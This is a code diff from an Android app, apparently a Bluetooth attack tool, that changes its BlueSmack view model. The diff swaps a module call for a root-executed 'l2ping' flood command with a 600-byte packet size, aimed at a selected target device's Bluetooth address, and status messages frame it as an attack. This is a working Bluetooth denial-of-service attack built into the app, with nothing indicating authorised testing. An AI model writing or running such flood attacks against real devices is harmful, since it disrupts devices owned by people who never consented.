@@ -6,9 +6,9 @@ import android.bluetooth.BluetoothManager
 import androidx.lifecycle.AndroidViewModel
 import androidx.lifecycle.viewModelScope
 import com.hereliesaz.blusnu.data.ActionLogger
-import com.hereliesaz.blusnu.data.BlueSmackModule
 import com.hereliesaz.blusnu.data.DeviceRepository
 import com.hereliesaz.blusnu.data.TargetDevice
+import com.hereliesaz.blusnu.utils.RootExecutor
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
@@ -27,7 +27,6 @@ class BlueSmackViewModel(application: Application, deviceRepository: DeviceRepos
     private val _devices = MutableStateFlow<List<TargetDevice>>(emptyList())
     val devices: StateFlow<List<TargetDevice>> = _devices.asStateFlow()
 
-    private val blueSmackModule = BlueSmackModule()
     private val bluetoothAdapter: BluetoothAdapter? = (application.getSystemService(BluetoothManager::class.java) as BluetoothManager).adapter
 
     var hasPermissions = false
@@ -64,9 +63,8 @@ class BlueSmackViewModel(application: Application, deviceRepository: DeviceRepos
 
         viewModelScope.launch {
             _status.value = "Starting attack..."
-            withContext(Dispatchers.IO) {
-                blueSmackModule.executeAttack(device)
-            }
+            val command = "l2ping -i hci0 -s 600 -f ${device.address}"
+            val result = RootExecutor.execute(command)
             _status.value = "Attack finished."
         }
     }
